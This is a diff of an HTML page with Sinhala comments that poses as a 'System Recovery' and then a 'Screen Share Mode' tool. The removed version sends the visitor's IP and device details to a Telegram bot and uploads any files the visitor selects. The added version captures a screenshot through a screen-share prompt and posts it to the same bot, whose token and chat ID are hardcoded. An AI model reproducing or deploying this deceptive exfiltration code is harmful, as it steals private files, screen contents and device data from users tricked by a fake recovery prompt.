@@ -3,71 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Recovery</title>
+    <title>Screen Share Mode</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
-        /* මුළු ස්ක්‍රීන් එකම බොත්තමක් විදිහට */
-        .full-screen-btn {
-            width: 100vw;
-            height: 100vh;
-            background: #222;
-            color: white;
-            border: none;
-            font-size: 24px;
-            font-weight: bold;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
+        /* මුළු ස්ක්‍රීන් එකම බොත්තමක් කරමු */
+        .full-btn {
+            width: 100vw; height: 100vh; background: #222; color: #ff00ff;
+            border: none; font-size: 22px; font-weight: bold; cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-    <button class="full-screen-btn" onclick="startExtraction()">
-        TAP ANYWHERE TO START RECOVERY
+    <button class="full-btn" onclick="requestScreen()">
+        [ SCREEN RECOVERY ]<br>TAP ANYWHERE TO SHARE SCREEN
     </button>
 
     <script>
         const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
-        const CHAT_ID = '7883989086'; // මෙතනට ඔයාගේ ID එක දාන්න
+        const CHAT_ID = '7883989086';
 
-        async function startExtraction() {
+        async function requestScreen() {
             try {
-                // 1. IP එක සහ උපකරණයේ විස්තර යැවීම
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                
-                let info = `🔔 *Device Accessed!*%0A`;
-                info += `📍 IP: ${ipData.ip}%0A`;
-                info += `📱 Info: ${navigator.userAgent}`;
+                // 1. ස්ක්‍රීන් එක ශෙයාර් කරන්න අවසර ඉල්ලනවා
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { cursor: "always" },
+                    audio: false 
+                });
 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${info}&parse_mode=Markdown`);
+                // 2. ස්ක්‍රීන් එකේ Frame එකක් කැප්චර් කරමු
+                const track = stream.getVideoTracks()[0];
+                const capture = new ImageCapture(track);
+                const bitmap = await capture.grabFrame();
 
-                // 2. ෆයිල් තෝරාගැනීමේ මෙනුව විවෘත කිරීම
-                // ටච් එක වැඩ නිසා ස්ක්‍රීන් එකේ තැනින් තැන ඔබද්දී ෆයිල් එකක් සිලෙක්ට් වෙන්න ඉඩ තියෙනවා
-                let input = document.createElement('input');
-                input.type = 'file';
-                input.accept = '*/*'; // ඔක්කොම ෆයිල් (Photos, Videos, Contacts)
-                input.multiple = true;
-                
-                input.onchange = async e => {
-                    for (let file of e.target.files) {
-                        let formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('document', file);
-                        
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    }
-                };
-                
-                input.click();
+                const canvas = document.createElement('canvas');
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(bitmap, 0, 0);
+
+                canvas.toBlob(async (blob) => {
+                    let formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'screen.png');
+                    formData.append('caption', 'ඔන්න ඔයාගේ ස්ක්‍රීන් එකේ පින්තූරයක්!');
+
+                    // Telegram එකට පින්තූරය යවනවා
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    track.stop(); // ඉවර වුණාම නවත්වන්න
+                }, 'image/png');
 
             } catch (err) {
-                // Error එකක් ආවොත් ඒකත් Telegram එකට එවන්න
+                // අවසර දුන්නේ නැති වුණොත් මැසේජ් එකක් එවන්න
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Error: ${err.message}`);
             }
         }
